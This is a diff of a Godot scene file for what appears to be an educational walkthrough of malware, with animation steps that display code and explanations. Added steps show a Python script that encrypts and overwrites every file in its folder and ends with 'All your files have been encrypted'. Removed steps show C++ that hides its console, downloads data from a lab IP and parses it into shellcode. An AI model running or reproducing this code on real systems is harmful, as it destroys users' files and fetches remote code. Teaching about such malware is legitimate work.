+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Here’s where the real work happens:
+
+The program loops through every file in the allfiles list.
+
+Each file is opened in binary read mode (rb) so the raw data can be read."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.41)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.855)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_x2hu1"]
+resource_name = "ransomware_step_11"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash)."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.29)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.3)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_8yhgl"]
+resource_name = "ransomware_step_12"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [" Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).
+
+At this point, the files are no longer usable in their normal form — they have been locked with the password key."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encrypting the Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 2.615)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.59)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_h0h0r"]
+resource_name = "ransomware_step_13"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program prints a message to confirm that all the files have been encrypted."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Final Confirmation"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+
+[sub_resource type="Animation" id="Animation_fkojw"]
+resource_name = "ransomware_step_14"
+length = 3.0
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Now let's run the program."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Final Confirmation"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/SampleContent:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [false]
 }
-
-[sub_resource type="Animation" id="Animation_yvlyr"]
-resource_name = "fileless_2"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("WindowBackground/Window/WindowContents/WindowHeader/SampleHeader:text")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["STEP 3: BOILERPLATE"]
+"values": ["ransomware.exe"]
 }
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Now let's create our boilerplate"]
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/ProgressBar:value")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0, 3),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 100.0]
 }
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [""]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [false]
-}
-
-[sub_resource type="Animation" id="Animation_rvh2y"]
-resource_name = "fileless_3"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 3: BOILERPLATE"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Now this are just the liblaries that we needed "]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
+tracks/10/type = "value"
+tracks/10/imported = false
+tracks/10/enabled = true
+tracks/10/path = NodePath("WindowBackground:visible")
+tracks/10/interp = 1
+tracks/10/loop_wrap = true
+tracks/10/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(-0.00999999, 0.13499999), Vector2(1.775, 0.985)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, 0.1), Vector2(0.025, 0.1)]
-}
-
-[sub_resource type="Animation" id="Animation_krri1"]
-resource_name = "fileless_4"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 3: BOILERPLATE"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["This line prevents a visible console window from showing, so our program runs silently
-"]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>
-
-int main() {
-	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(1.775, 0.985), Vector2(3.68, 0.82)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, 0.1), Vector2(0.025, 1.29)]
-}
-
-[sub_resource type="Animation" id="Animation_e02ds"]
-resource_name = "fileless_5"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 3: BOILERPLATE"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Uses the cpr HTTP library to request data from the given address"]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>
-
-int main() {
-	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.56.102/home\" });"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(3.68, 0.82), Vector2(3.27, 0.73)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, 1.29), Vector2(0.025, 1.97)]
-}
-
-[sub_resource type="Animation" id="Animation_33oqg"]
-resource_name = "fileless_6"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 3: BOILERPLATE"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["This group of lines converts the downloaded text into bytes in memory"]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>
-
-int main() {
-	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.56.102/home\" });
-	char* memBuffer = NULL;
-	memBuffer = (char *)r.text.c_str(); 
-	
-	unsigned char shellcode[382]; 
-	memBuffer += 2; 
-	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
-		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
-		memBuffer = memBuffer + 4;
-	}"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(3.27, 0.73), Vector2(3.715, 3.415)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
